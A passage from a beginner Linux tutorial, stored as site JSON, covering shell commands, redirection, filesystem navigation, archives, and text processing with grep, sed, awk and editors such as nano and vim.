The Docker socket is the control plane for the host daemon. A container that can reach it can start privileged containers, mount host paths and usually take over the host. Avoid --privileged, --pid=host, --network=host and bind mounts of /, /etc, /var or your entire home directory. Publish ports on 127.0.0.1 unless you intentionally want other machines to connect. A container shares the host kernel and usually does not run a full init system. Use a virtual machine for kernel modules, firewalls, boot troubleshooting and systemd service exercises. Use the container for command practice, file work and disposable experiments. Know your prompt A typical prompt looks like this: alex@lab:~$ It usually contains: alex: the current user. lab: the hostname. ~: the current directory, where ~ means your home directory. $: a normal user prompt. A # usually means root. The prompt is generated by the shell. You can change it later, but for now read it as a status line: who you are, where you are and how much privilege you have. The anatomy of a command Most commands follow this shape: command [options] [arguments] For example: ls -la /var/log ls is the command. -la combines two short options: -l for a long listing and -a to include hidden files. /var/log is the argument, in this case the directory to list. Long options often use two hyphens: ls --all --human-readable /var/log Options change behavior. Arguments tell the command what to act on. Read the manual when the difference is unclear. Get help without guessing Linux ships with documentation. Use it before copying random commands from the internet. man ls ls --help apropos \"list files\" info coreutils man opens the manual page in a pager. Use Up, Down, PageUp, PageDown, / to search and q to quit. The synopsis at the top shows the accepted options. The description explains each one. The examples at the bottom are often the fastest way to learn. --help is usually shorter and works even when man pages are not installed. apropos searches manual page descriptions. If it returns nothing, the manual database may need to be rebuilt with mandb. Some systems include tldr, a community-maintained collection of practical examples. It is useful, but it is not a substitute for the real manual. Exit status and command chaining Every command returns an exit status. 0 means success. A non-zero value means failure, and the meaning depends on the program. ls /etc/passwd echo \"$?\" ls /does-not-exist echo \"$?\" The special variable $? holds the status of the previous command. You can chain commands based on that status: mkdir -p /tmp/lab && cd /tmp/lab && runs the second command only if the first succeeds. || runs the second command only if the first fails. A semicolon runs both regardless. grep -q root /etc/passwd && echo \"root entry found\" grep -q missing /etc/passwd || echo \"entry not found\" This is the beginning of shell logic. Later you will use the same idea in scripts. Quoting and expansion The shell expands certain characters before a command runs. The three common quoting forms behave differently: Form Behavior Example 'single' Literal text, no expansion echo '$HOME' \"double\" Expands variables and command substitution echo \"$HOME\" backslash Escapes the next character echo \\$HOME Use double quotes by default for variables. Use single quotes when you want the exact text. Use backslash when you need one special character to be literal. Command substitution runs a command and inserts its output: today=$(date +%F) printf 'Today is %s\\n' \"$today\" The $(...) form is easier to read and nest than backticks. Redirection and pipes Programs read from standard input and write to standard output and standard error. The shell can redirect those streams. Operator Meaning > Write standard output to a file, replacing it >> Append standard output to a file 2> Write standard error to a file 2>&1 Send standard error to the same place as standard output \u003c Read standard input from a file | Send standard output to another command Examples: ls -la /etc > /tmp/etc-list.txt grep root /etc/passwd > /tmp/root-entry.txt 2> /tmp/grep-errors.txt printf 'one\\ntwo\\nthree\\n' | wc -l A pipe connects commands into a small data-processing pipeline. This is one of the most important ideas in the shell. You will use it constantly. Terminal habits Use Tab to complete paths and command names. It reduces typos. Use Ctrl+R to search your command history. Use Ctrl+C to interrupt the foreground command. Use Ctrl+D to send end-of-file or exit an interactive shell. Use Ctrl+L to clear the screen without losing your place. Use history to review previous commands. Use !! to repeat the last command, and !$ for its last argument. Be careful with !! and sudo. Read the command before you run it again. Manual sections and command discovery Manual pages are organized into numbered sections. The same name can appear in more than one section with different meanings. Section Contents Example 1 User commands man 1 ls 2 System calls man 2 open 3 Library functions man 3 printf 4 Device files man 4 tty 5 File formats and configuration man 5 passwd 7 Miscellaneous concepts man 7 signal 8 System administration commands man 8 mount If you are not sure where a command lives, ask the system: type -a ls command -v ls which ls whereis ls whatis ls type -a reports every definition the shell knows about, including aliases and functions. command -v prints the path or builtin name the shell would use. which searches PATH but may not see functions or builtins. whereis finds binaries, source and manual pages. whatis prints the one-line manual description. Manual pages can be searched by keyword: apropos 'copy files' man -k 'copy files' If apropos returns nothing, the manual database may be missing. Rebuild it with sudo mandb on Debian or Ubuntu. Startup files and environment The shell reads configuration files when it starts. The exact files depend on the shell and on whether the session is a login shell, an interactive shell or a script. For Bash, the common files are: File Typical use /etc/profile System-wide login shell settings /etc/bash.bashrc System-wide interactive Bash settings on Debian and Ubuntu ~/.profile Per-user login shell settings ~/.bash_profile Per-user login shell settings, if present ~/.bash_login Alternative login file, read if .bash_profile is absent ~/.bashrc Per-user interactive Bash settings Bash reads only the first of ~/.bash_profile, ~/.bash_login or ~/.profile that exists for a login shell. Interactive non-login shells usually read ~/.bashrc. Scripts normally read neither, unless they source a file explicitly. This is why environment changes can appear inconsistent. A variable exported in ~/.bashrc may not exist in a systemd service, a cron job or a non-interactive SSH command. Put system-wide environment settings in the right place for the service manager, not in a shell startup file. Inspect the environment: env printenv printenv PATH set export MY_LAB=foundations printenv MY_LAB env and printenv show exported variables. set also shows shell variables and functions. export marks a variable for child processes. A variable can exist in your shell and still be invisible to a program if it was never exported. Common variables worth understanding: Variable Meaning HOME Your home directory USER Your username PATH Search order for commands PWD Current working directory OLDPWD Previous working directory SHELL Configured login shell LANG, LC_* Locale and character handling TERM Terminal type EDITOR, VISUAL Preferred text editor TMPDIR Preferred temporary directory Aliases, functions and history An alias is a short name for a command line. It is expanded by the interactive shell before the command runs. alias ll='ls -la' alias unalias ll Aliases are convenient but fragile. They are not available to scripts by default, and they do not accept arguments in the same way as a function. For anything more complex, use a function. mkcd() { mkdir -p -- \"$1\" && cd -- \"$1\" } mkcd ~/linux-foundations/lab02 A function runs in the current shell, so cd inside it changes your directory. That is useful for workflow helpers. Put functions in ~/.bashrc or a separate file that you source. History is a working memory aid: history history 20 history | grep ssh !! !$ !42 !! repeats the previous command. !$ inserts the last argument of the previous command. !42 runs history entry 42. Be careful with sudo !!. Read the command before repeating it with elevated privilege. Useful history settings in ~/.bashrc: HISTSIZE=5000 HISTFILESIZE=20000 HISTCONTROL=ignoreboth shopt -s histappend ignoreboth avoids storing duplicate lines and lines that begin with a space. histappend appends to the history file instead of overwriting it when a shell exits. How the shell parses a command The shell performs several expansions before a program starts. A simplified order is: Split the input into tokens using quoting rules. Expand aliases in interactive shells. Expand braces, such as {a,b}. Expand tilde, such as ~ and ~user. Expand parameters and variables, such as $HOME. Perform command substitution, such as $(date). Perform arithmetic expansion, such as $((2 + 2)). Split unquoted results into words. Expand glob patterns, such as *.conf. Remove quote characters. Run the command with the resulting arguments. The order explains many surprises. A variable containing spaces becomes several arguments if you leave it unquoted. A glob inside quotes stays literal. A command substitution that outputs a newline can change the argument count. name='two words' printf '[%s]\\n' $name printf '[%s]\\n' \"$name\" The first printf receives two arguments. The second receives one. This is one of the most important quoting lessons in shell work. More redirection The basic redirection operators are only the start. The shell can also feed a command from a here document or a here string. cat \u003c\u003c'EOF' line one line two EOF grep root \u003c\u003c\u003c 'root:x:0:0:root:/root:/bin/bash' A quoted here document delimiter, such as 'EOF', prevents variable expansion. An unquoted delimiter allows it. Here strings are convenient for a single line of input. Discard output or errors: command > /dev/null command 2> /dev/null command > /dev/null 2>&1 /dev/null is a device that discards everything written to it. Redirecting both streams is common when a script only cares about the exit status. Send output to a file and the terminal at the same time: command | tee output.txt command | tee -a output.txt Append both standard output and standard error to one file: command >> combined.log 2>&1 Order matters. In > file 2>&1, standard error is pointed at the same place standard output currently points. In 2>&1 > file, standard error still points at the terminal because the order is reversed. Lab: build a workspace Create a small workspace and practice the basic operations: mkdir -p ~/linux-foundations/lab01 cd ~/linux-foundations/lab01 pwd printf 'alpha\\nbeta\\ngamma\\n' > words.txt ls -la wc -l words.txt cat words.txt grep beta words.txt Now test exit status: grep alpha words.txt echo \"$?\" grep missing words.txt echo \"$?\" Finally, read the manual for a command you use every day: man ls Search for the -h option and the -t option. Write one sentence explaining what each does. Common mistakes Running a command as root before reading what it does. Forgetting that > overwrites a file. Using rm -rf with a variable that turned out to be empty. Assuming --help and the man page always say the same thing. Copying a command with curly quotes or hidden Unicode characters. Checkpoint You should now be able to: Start a safe Linux lab and take a snapshot. Read a shell prompt. Break a command into command, options and arguments. Find help with man and --help. Chain commands with && and ||. Redirect output and build a simple pipeline. Next you will put the filesystem under your control."},{"kind":"foundation","number":3,"order":103,"href":"foundations/03-files-and-filesystem.html","slug":"03-files-and-filesystem","page":"03-files-and-filesystem.html","title":"Files, Directories and the Filesystem","short":"Files and paths","summary":"Navigate the hierarchy and create, copy, link, find and remove files without breaking the tree.","part":"foundations","partNum":"HF","partName":"Linux Foundations","readMinutes":17,"words":2021,"sections":18,"codeBlocks":30,"headings":[{"id":"absolute-and-relative-paths","text":"Absolute and relative paths","level":2},{"id":"list-and-inspect-files","text":"List and inspect files","level":2},{"id":"create-copy-move-and-remove","text":"Create, copy, move and remove","level":2},{"id":"globbing","text":"Globbing","level":2},{"id":"hard-links-and-symbolic-links","text":"Hard links and symbolic links","level":2},{"id":"find-files","text":"Find files","level":2},{"id":"work-with-spaces-and-odd-names","text":"Work with spaces and odd names","level":2},{"id":"filesystems-and-mount-points","text":"Filesystems and mount points","level":2},{"id":"measure-directory-usage","text":"Measure directory usage","level":2},{"id":"archives-and-compression","text":"Archives and compression","level":2},{"id":"copy-trees-and-make-backups","text":"Copy trees and make backups","level":2},{"id":"metadata-attributes-and-extended-attributes","text":"Metadata, attributes and extended attributes","level":2},{"id":"locate-files-quickly","text":"Locate files quickly","level":2},{"id":"safe-deletion-and-recovery","text":"Safe deletion and recovery","level":2},{"id":"batch-commands-with-xargs","text":"Batch commands with xargs","level":2},{"id":"lab-map-a-small-tree","text":"Lab: map a small tree","level":2},{"id":"common-mistakes","text":"Common mistakes","level":2},{"id":"checkpoint","text":"Checkpoint","level":2}],"text":"The Linux filesystem is a single tree. Disks, partitions and network shares are attached to that tree at mount points. Once you understand paths, file types and links, most navigation and file management becomes predictable. Absolute and relative paths An absolute path starts at / and does not depend on your current directory: /etc/ssh/sshd_config A relative path starts from your current directory: ssh/sshd_config The special path components are: Symbol Meaning . Current directory .. Parent directory ~ Your home directory ~user Another user's home directory / Filesystem root pwd cd /var/log pwd cd .. pwd cd ~ pwd cd - returns to the previous directory. That is useful when you are moving between two locations. List and inspect files ls ls -l ls -la ls -lh ls -R -l gives a long listing, -a includes hidden entries, -h makes sizes human readable, and -R recurses into directories. On a long listing, the first character tells you the file type: Character Type - Regular file d Directory l Symbolic link c Character device b Block device s Socket p Named pipe file identifies content by inspecting its header, and stat shows metadata such as inode, size, permissions and timestamps: file /etc/passwd file /bin/ls stat /etc/passwd The inode is the filesystem's internal record for a file. A filename is a directory entry that points to an inode. This distinction matters when you study hard links. Create, copy, move and remove mkdir -p ~/linux-foundations/lab02/notes cd ~/linux-foundations/lab02 touch notes/empty.txt printf 'first line\\n' > notes/first.txt cp notes/first.txt notes/copy.txt mv notes/copy.txt notes/renamed.txt ls -la notes rm notes/renamed.txt rmdir notes/empty-dir Use mkdir -p to create a path and any missing parents. Use cp -r for directories, cp -a to preserve attributes, and mv to rename or move. rm deletes files. There is no recycle bin on the command line, so check the path before pressing Enter. A safe pattern is to list the target before deleting it: ls -la /tmp/example rm -r /tmp/example For interactive confirmation, use rm -i. For directories, rm -r removes contents recursively. rmdir only removes empty directories. Globbing The shell expands wildcard patterns before the command runs: Pattern Matches * Any number of characters ? Exactly one character [abc] One character from the set [a-z] One character in the range [!abc] One character not in the set ls /etc/*.conf ls /etc/[a-c]*.conf printf '%s\\n' /etc/*.d Quote a glob when you want the command to receive the literal pattern: printf '%s\\n' '*.conf' Globs are expanded by the shell, not by ls or grep. That is why an unmatched pattern can pass through unchanged. Hard links and symbolic links A hard link is another directory entry for the same inode. Both names refer to the same file data. Deleting one name does not delete the data until the last hard link is gone. A symbolic link, or symlink, is a small file that contains a path to another file. If the target is removed, the symlink remains but becomes broken. printf 'shared data\\n' > original.txt ln original.txt hardlink.txt ln -s original.txt symlink.txt ls -li stat original.txt hardlink.txt symlink.txt Hard links cannot cross filesystems and usually cannot point to directories. Symlinks can cross filesystems and can point to directories, but they depend on the target path. Find files find walks a directory tree and evaluates expressions. It is more precise than a recursive ls. find /etc -maxdepth 1 -type f -name '*.conf' find /var/log -type f -size +1M find ~/linux-foundations -type d -name 'notes' find /tmp -type f -mtime -1 find . -name '*.txt' -print Common tests: Test Meaning -type f Regular file -type d Directory -type l Symbolic link -name Match the filename -iname Case-insensitive name match -size Match size, such as +1M -mtime Match modification time in days -user Match owner -perm Match permission bits You can act on results with -exec: find /tmp -maxdepth 1 -type f -name '*.log' -exec ls -lh {} \\; The {} placeholder is replaced by each path. The escaped semicolon ends the command. Use -delete only after testing the same expression with -print. Work with spaces and odd names Filenames can contain spaces, quotes and leading hyphens. Quote paths and use -- to end option parsing: mkdir -p \"$HOME/linux-foundations/odd names\" cd \"$HOME/linux-foundations/odd names\" touch -- '-leading-dash.txt' ls -la rm -- '-leading-dash.txt' For scripts that process arbitrary filenames, use null-delimited tools: find . -maxdepth 1 -type f -print0 | while IFS= read -r -d '' file; do printf 'file: %s\\n' \"$file\" done This avoids breaking on spaces and newlines. Filesystems and mount points A directory tree can contain several filesystems. Each filesystem has its own rules, features and free space. The root directory / is not special in the way Windows drive letters are. It is simply the top of one mounted filesystem, and other filesystems are attached below it. Common Linux filesystems include: Filesystem Strengths Notes ext4 Mature, fast, widely supported Good default for general use XFS Large files and parallel I/O Common on Red Hat family systems Btrfs Snapshots, subvolumes, checksums More complex to operate ZFS Snapshots, checksums, pooling Usually installed separately tmpfs Memory backed, fast, temporary Lost at reboot NFS Shared over the network Depends on network and server FAT32, exFAT Interoperability with other systems Limited permissions and metadata Inspect what is mounted and how much space is free: findmnt df -h df -i lsblk -f df -h reports filesystem usage in human-readable units. df -i reports inode usage. A filesystem can have free space and still be unable to create files if it has run out of inodes. lsblk -f shows block devices, their filesystems, labels and mount points. It is a quick way to see which disk backs which directory. Measure directory usage du reports how much space a directory tree consumes. du -sh /var/log du -h --max-depth=1 /var | sort -h du -ah ~/linux-foundations | sort -h | tail -n 20 -s summarizes instead of listing every file. -h makes sizes readable. --max-depth=1 limits the walk. Sorting by size turns the output into a useful report. du and df can disagree. du walks visible files. df asks the filesystem. A deleted file that is still open continues to consume space until the last process closes it. Find those files with: lsof +L1 Archives and compression An archive combines many files into one. Compression reduces size. Linux treats them as separate steps, although many tools combine them. tar -cvf archive.tar notes/ tar -tf archive.tar tar -xvf archive.tar tar -czvf archive.tar.gz notes/ tar -xzvf archive.tar.gz tar -cJvf archive.tar.xz notes/ tar -xJvf archive.tar.xz The common flags are: Flag Meaning -c Create an archive -x Extract an archive -t List contents -v Verbose output -f Use the next argument as the archive file -z Compress with gzip -j Compress with bzip2 -J Compress with xz Always list an archive before extracting it, especially if it came from someone else. tar -tf does not write files. Extraction can overwrite existing files, so extract into an empty directory first when you are unsure. Single-file compression tools are also common: gzip file.txt gunzip file.txt.gz xz file.txt unxz file.txt.xz zip archive.zip file.txt unzip -l archive.zip unzip archive.zip gzip and xz replace the original file by default. Use -k to keep it. zip and unzip are common for interoperability, but they store Unix permissions and ownership differently from tar. Copy trees and make backups cp -a preserves permissions, timestamps and links. rsync is better for repeated copies because it transfers only changes. cp -a notes notes-backup rsync -av --delete notes/ notes-backup/ rsync -av --dry-run notes/ remote:/backup/notes/ rsync -av notes/ remote:/backup/notes/ The trailing slash matters. notes/ means the contents of the directory. notes means the directory itself. A dry run shows what would change without writing anything. Review it before using --delete. rsync is not a backup by itself. A backup needs a separate copy, a retention plan and a tested restore. A mirror that deletes files when the source deletes them is a synchronization tool, not a historical archive. Metadata, attributes and extended attributes stat shows more than ls -l: stat notes/first.txt stat -c '%n %s bytes %U:%G %a %y' notes/first.txt The format string is useful in scripts. %n is the name, %s the size, %U the owner, %G the group, %a the octal mode and %y the modification time. Some filesystems support extended attributes: setfattr -n user.comment -v 'lab notes' notes/first.txt getfattr -d notes/first.txt Extended attributes store small pieces of metadata. They are used by ACLs, SELinux labels and some backup tools. Not every filesystem or mount option supports them. File attributes are a separate mechanism: lsattr notes/first.txt sudo chattr +i notes/first.txt sudo chattr -i notes/first.txt The immutable attribute, +i, prevents modification, deletion and renaming even for root until the attribute is removed. Use it deliberately. It can protect a critical file, and it can also confuse you when a normal edit fails. Locate files quickly find is precise but walks the tree every time. locate uses a prebuilt database and is much faster, but the database may be stale. sudo updatedb locate sshd_config locate -i readme tree prints a directory as a tree when it is installed: tree -L 2 ~/linux-foundations tree -a -L 1 /etc If tree is missing, find can approximate it: find ~/linux-foundations -maxdepth 3 -print Safe deletion and recovery The command line has no recycle bin. Before a recursive delete, print the target and confirm the path: target=~/linux-foundations/lab02/archive printf 'target: %s\\n' \"$target\" find \"$target\" -maxdepth 2 -print rm -r -- \"$target\" Use -- before a path that might begin with a hyphen. Never build a destructive command from an unvalidated variable. A empty variable in rm -rf \"$dir\"/* is safer than in rm -rf $dir/*, but both deserve a check. If you delete a file by accident, stop writing to that filesystem. Recovery chances drop as new data overwrites the blocks. Restore from a backup or snapshot when possible. Tools such as testdisk and photorec can help, but they are not a substitute for backups. Batch commands with xargs Some commands do not accept a long list of files on the command line. xargs reads items from standard input and runs a command with them. printf '%s\\n' a.txt b.txt c.txt | xargs -n 1 printf 'file: %s\\n' find /var/log -maxdepth 1 -type f -name '*.log' -print0 | xargs -0 -n 1 ls -lh find /tmp -maxdepth 1 -type f -name '*.tmp' -print0 | xargs -0 -r rm -- -n 1 passes one item per command. -0 expects null-separated input, which is the safe form for arbitrary filenames. -r avoids running the command when the input is empty. The -- before rm ends option parsing. Without -0, filenames with spaces or quotes can be split incorrectly. A filename could even be interpreted as an option. Use find -print0 | xargs -0 or a while read loop. xargs -P runs commands in parallel: find ~/linux-foundations -type f -name '*.txt' -print0 \\ | xargs -0 -n 1 -P 4 gzip Parallel jobs are faster on large batches but harder to read and debug. Start with one job, confirm the command is correct, then increase parallelism. Lab: map a small tree mkdir -p ~/linux-foundations/lab02/{docs,logs,archive} cd ~/linux-foundations/lab02 printf 'alpha\\n' > docs/a.txt printf 'beta\\n' > docs/b.txt printf 'gamma\\n' > logs/c.log ln -s ../docs/a.txt logs/a-link.txt find . -maxdepth 3 -printf '%y %p -> %l\\n' Then: Copy docs/a.txt to archive/a-copy.txt. Rename docs/b.txt to docs/b-renamed.txt. Create a hard link to archive/a-copy.txt. Use stat to compare the inode numbers. Remove the original docs/a.txt and check whether the hard link still works. Check whether the symlink in logs is now broken. Common mistakes Using rm -rf with a path you have not listed first. Forgetting that cp on a directory needs -r. Assuming a symlink is a copy. It is a pointer. Running find / without narrowing the search. Forgetting to quote paths that contain spaces. Checkpoint You should now be able to: Explain absolute and relative paths. Read a long listing and identify file types. Create, copy, move, link and remove files safely. Use globs and find to locate files. Explain the difference between hard links and symbolic links. Next you will read, search and edit file contents."},{"kind":"foundation","number":4,"order":104,"href":"foundations/04-reading-searching-editing.html","slug":"04-reading-searching-editing","page":"04-reading-searching-editing.html","title":"Reading, Searching and Editing Files","short":"Text and editors","summary":"Read long files, search text, build pipelines and edit configuration with nano or vim.","part":"foundations","partNum":"HF","partName":"Linux Foundations","readMinutes":18,"words":2279,"sections":16,"codeBlocks":31,"headings":[{"id":"read-a-file-without-flooding-the-terminal","text":"Read a file without flooding the terminal","level":2},{"id":"count-and-number-lines","text":"Count and number lines","level":2},{"id":"search-with-grep","text":"Search with grep","level":2},{"id":"pipes-turn-small-tools-into-one-workflow","text":"Pipes turn small tools into one workflow","level":2},{"id":"redirection-and-tee","text":"Redirection and tee","level":2},{"id":"text-processing-basics","text":"Text processing basics","level":2},{"id":"edit-files-with-nano","text":"Edit files with nano","level":2},{"id":"edit-files-with-vim","text":"Edit files with vim","level":2},{"id":"regular-expressions-in-practice","text":"Regular expressions in practice","level":2},{"id":"stream-editing-with-sed","text":"Stream editing with sed","level":2},{"id":"field-processing-with-awk","text":"Field processing with awk","level":2},{"id":"compare-and-combine-files","text":"Compare and combine files","level":2},{"id":"structured-text-and-encodings","text":"Structured text and encodings","level":2},{"id":"lab-build-a-small-report","text":"Lab: build a small report","level":2},{"id":"common-mistakes","text":"Common mistakes","level":2},{"id":"checkpoint","text":"Checkpoint","level":2}],"text":"Most Linux work is text work. Configuration lives in text files, logs are text streams, command output is text and scripts are text. Learn to read, filter and edit text efficiently and the rest of the system becomes easier to inspect. Read a file without flooding the terminal cat /etc/hostname less /etc/services head -n 20 /var/log/syslog tail -n 20 /var/log/syslog cat prints the whole file. It is fine for short files and terrible for long ones. less opens a pager with search and scrolling. Use /pattern to search, n for the next match, g for the top, G for the bottom and q to quit. head and tail show the beginning and end of a file. tail -f follows a file as it grows, which is useful for live logs: tail -f /var/log/auth.log Press Ctrl+C to stop following. Count and number lines wc -l /etc/passwd wc -w /etc/passwd wc -c /etc/passwd nl -ba /etc/hostname wc -l counts newline characters, not logical lines. A file without a final newline can report one fewer line than you expect. nl numbers lines, which is useful when discussing a specific part of a file. Search with grep grep prints lines that match a pattern. grep root /etc/passwd grep -i error /var/log/syslog grep -n 'Failed password' /var/log/auth.log grep -r 'PermitRootLogin' /etc/ssh grep -v '^#' /etc/ssh/sshd_config Common options: Option Meaning -i Ignore case -n Show line numbers -r Recurse into directories -v Invert the match -w Match whole words -F Treat the pattern as fixed text -E Use extended regular expressions -l Print only matching filenames -c Print a match count Basic regular expressions include . for any character, * for zero or more of the previous character, ^ for the start of a line, $ for the end of a line and [abc] for a character class. grep -nE '^(root|daemon):' /etc/passwd grep -nE 'Failed|Invalid' /var/log/auth.log rg from ripgrep is a faster recursive search tool when it is installed. It respects .gitignore by default, which is helpful in code directories but can hide files when you are investigating a system. Pipes turn small tools into one workflow A pipe sends the output of one command into the input of another. This is the core of the Unix style: small programs, connected well. ps -ef | grep ssh grep -v '^#' /etc/services | head cat /var/log/syslog | wc -l The third example is a useless use of cat. wc -l /var/log/syslog does the same work with one process. Use cat when you need to concatenate files or when a command only reads from standard input, not as a reflex. A more useful pipeline: grep 'Failed password' /var/log/auth.log \\ | awk '{print $(NF-3)}' \\ | sort \\ | uniq -c \\ | sort -nr \\ | head This counts failed login attempts by source address. Read it from left to right: find lines, extract a field, sort, count duplicates, sort by count and show the top results. Do not worry about the exact field position yet. The point is that each stage does one job. Redirection and tee command > output.txt command >> output.txt command 2> errors.txt command > output.txt 2>&1 command | tee output.txt command | tee -a output.txt > replaces a file. >> appends. 2> redirects standard error. 2>&1 sends error to the same destination as normal output. tee writes to both the terminal and a file, which is useful when you want to watch a process and keep a record. ping -c 4 127.0.0.1 | tee ping.txt Text processing basics You will not become an awk expert in one page, but you should recognize the common tools. cut -d: -f1 /etc/passwd sort /etc/passwd sort -u /etc/passwd uniq -c sorted.txt tr '[:lower:]' '[:upper:]' \u003c /etc/hostname sed -n '1,10p' /etc/passwd sed 's/old/new/g' file.txt awk -F: '{print $1, $3}' /etc/passwd Tool Use cut Select fields or characters sort Sort lines uniq Collapse adjacent duplicates tr Translate or delete characters sed Stream editing and substitution awk Field-based processing and reporting uniq only collapses adjacent duplicates, so sort first if you want a true unique list. Edit files with nano nano is a small, friendly editor. It is a good default when you need to make a quick change. nano notes.txt The bottom of the screen shows the shortcuts. Ctrl+O writes the file, Enter confirms the filename, Ctrl+X exits, Ctrl+K cuts a line and Ctrl+U pastes it. Ctrl+W searches. Before editing a system file, make a backup: sudo cp /etc/ssh/sshd_config /etc/ssh/sshd_config.bak sudo nano /etc/ssh/sshd_config Then validate the change before restarting a service. A broken configuration file can lock you out of a remote system. Edit files with vim vim is everywhere, including minimal systems where nano is not installed. You do not need to master it, but you should be able to open, edit, save and quit. vim notes.txt vimtutor vimtutor opens a guided lesson. Run it once and work through the whole file. It is faster than memorizing a wall of shortcuts. Vim has modes. Normal mode is for navigation and commands. Insert mode is for typing. Visual mode selects text. Command-line mode starts with :. Mode How to enter Use Normal Esc Move, delete, copy and run commands Insert i, a, o Type text Visual v, V, Ctrl+v Select characters, lines or blocks Command line : Save, quit, search and replace Move around in normal mode: Key Action h, j, k, l Left, down, up, right w, b, e Next word, previous word, end of word 0, ^, $ Start of line, first non-blank, end of line gg, G Start of file, end of file :42 Go to line 42 Ctrl+d, Ctrl+u Half page down, half page up Ctrl+f, Ctrl+b Page down, page up % Jump to the matching bracket Edit text: Key Action i, I Insert before the cursor, at the start of the line a, A Append after the cursor, at the end of the line o, O Open a new line below, above x, X Delete a character, delete the character before the cursor dw, dd, D Delete a word, a line, to the end of the line d0, d$ Delete to the start, end of the line yy, yw Yank a line, a word p, P Paste after, before u, Ctrl+r Undo, redo r, cc, C Replace a character, change a line, change to the end >>, \u003c\u003c Indent, outdent . Repeat the last change Search, replace and manage files: Key Action /pattern, ?pattern Search forward, backward n, N Next match, previous match * Search for the word under the cursor :%s/old/new/g Replace every match in the file :s/old/new/g Replace every match on the current line :%s/old/new/gc Replace with confirmation :noh Clear search highlighting :w, :q, :wq, :q! Save, quit, save and quit, quit without saving :e file Open another file :split file, :vsplit file Split horizontally, vertically Ctrl+w w Switch between splits :ls, :bn, :bp List buffers, next buffer, previous buffer Visual mode and macros: v select characters V select lines Ctrl+v select a block y d > \u003c yank, delete, indent, outdent qa start recording a macro into register a q stop recording @a run macro a @@ repeat the last macro Useful settings for reading and editing configuration: :set number :set relativenumber :set paste :set nohlsearch Use sudoedit for system files. It runs your editor with your normal environment and writes the result through sudo, which avoids leaving root-owned swap or configuration files behind: sudoedit /etc/ssh/sshd_config If you get lost, press Esc a few times, then type :q! to leave without saving. Regular expressions in practice A regular expression describes a pattern. grep, sed, awk, find and many editors use some version of them. The basics are consistent, but the exact syntax depends on the tool. Pattern Matches . Any single character except a newline ^ Start of a line $ End of a line * Zero or more of the previous item + One or more of the previous item, in extended mode ? Zero or one of the previous item, in extended mode [abc] One character from the set [^abc] One character not in the set [a-z] One character in the range [[:digit:]] One digit, in a POSIX character class [[:alpha:]] One letter [[:space:]] One whitespace character (...) Group, in extended mode `a b` \\b Word boundary in many implementations Use single quotes around patterns so the shell does not expand them. Use grep -E for extended regular expressions, or grep -P for Perl-compatible expressions when available. grep -nE '^(root|daemon):' /etc/passwd grep -nE 'Failed|Invalid' /var/log/auth.log grep -oE '([0-9]{1,3}\\.){3}[0-9]{1,3}' /var/log/auth.log | sort -u grep -vE '^\\s*(#|$)' /etc/ssh/sshd_config The last command removes comment lines and blank lines. [0-9]{1,3} repeats a digit class. The escaped dot matches a literal dot rather than any character. grep -o prints only the matching part. That is useful for extracting addresses, usernames or identifiers. grep -c counts matching lines, not matches. grep -l prints filenames. grep -L prints files without a match. Search a code tree while excluding unrelated directories: grep -rn --include='*.conf' --exclude-dir='.git' 'Listen' /etc /opt 2>/dev/null The 2>/dev/null hides permission errors. Do not hide all errors on a system you are troubleshooting until you have seen them once. Stream editing with sed sed reads input, applies commands and writes output. By default it prints every line. sed -n '1,10p' /etc/passwd sed -n '/^root/p' /etc/passwd sed 's/:/\\t/g' /etc/passwd | head sed -E 's/^(root|daemon):[^:]*/\\1:REDACTED/' /etc/passwd -n suppresses automatic printing. The p command prints selected lines. s/old/new/ substitutes the first match on each line. Add g to replace every match. Addresses select lines: sed -n '5,12p' file.txt sed -n '/start/,/end/p' file.txt sed '/^#/d' file.txt 5,12p selects a line range. /start/,/end/p selects from one pattern to another. d deletes matching lines from the output. Edit a file in place, keeping a backup: sed -i.bak 's/old-value/new-value/g' config.txt Always inspect the result: diff -u config.txt.bak config.txt sed is not a full programming language, but it is excellent for predictable line-oriented edits. For complex parsing, use awk, Python or a real configuration tool. Field processing with awk awk treats each line as a record and each record as fields. It is ideal for reports and quick extraction. awk -F: '{print $1, $3}' /etc/passwd awk -F: '$3 >= 1000 {print $1, $3, $7}' /etc/passwd awk -F: 'BEGIN {print \"user uid\"} {print $1, $3} END {print \"done\"}' /etc/passwd awk '{print NR, $0}' file.txt awk '{print NF, $NF}' file.txt Variable Meaning $0 The whole record $1, $2 Fields $NF The last field NF Number of fields NR Current record number across all input FNR Record number in the current file FS Input field separator OFS Output field separator -F: sets the field separator to a colon. A pattern before the action filters records. BEGIN runs before input. END runs after input. A more realistic report: awk -F: '$3 >= 1000 && $3 \u003c 65534 { printf \"%-18s %6s %s\\n\", $1, $3, $7 }' /etc/passwd | sort Use printf when alignment matters. Use sort -k to sort by a specific field: awk -F: '{print $1, $3}' /etc/passwd | sort -k2,2n Compare and combine files diff -u old.txt new.txt diff -r dir1 dir2 patch -p1 \u003c change.patch comm -12 \u003c(sort a.txt) \u003c(sort b.txt) join -t: -1 1 -2 1 sorted-a.txt sorted-b.txt paste -d, a.txt b.txt column -t -s: /etc/passwd diff -u produces a unified diff that patch can apply. comm compares two sorted files. join combines lines with a common key. paste places files side by side. column -t aligns columns for reading. The \u003c(...) syntax is process substitution. The shell runs the command and provides its output as a temporary file-like object. It is a Bash feature, not portable to every shell. Structured text and encodings JSON and YAML are common in configuration and APIs. python3 -m json.tool data.json jq . data.json jq -r '.items[] | .name' data.json yq '.services.web.image' compose.yml jq is a full JSON query language. Start with . to pretty-print, then select fields. yq is similar for YAML. If these tools are missing, Python is a reliable fallback for JSON. Check a file's type before opening it in a text editor: file mystery.dat file -i mystery.dat strings -n 6 mystery.dat | head xxd -l 128 mystery.dat file inspects magic bytes. file -i reports the MIME type and charset. strings extracts printable runs from a binary. xxd shows a hex dump. Convert text encodings with iconv: iconv -f ISO-8859-1 -t UTF-8 old.txt > new.txt If a file contains invalid bytes, iconv stops. Use -c to drop invalid characters, but only after you understand what is being lost. Base64 is an encoding, not encryption: base64 file.bin > file.b64 base64 -d file.b64 > file.bin Lab: build a small report mkdir -p ~/linux-foundations/lab04 cd ~/linux-foundations/lab04 cp /etc/passwd users.txt grep -v '^#' users.txt | cut -d: -f1,3,7 > report.txt sort report.txt -o report.txt head -n 5 report.txt wc -l report.txt Then answer: How many user entries are in the report? Which shells appear in the last field? Which account has UID 0? What happens if you run grep -v '^#' users.txt > users.txt? Do not run it on an important file. Explain the risk. Common mistakes Editing a file in place with a redirection that points to the same file. Restarting a service before validating its configuration. 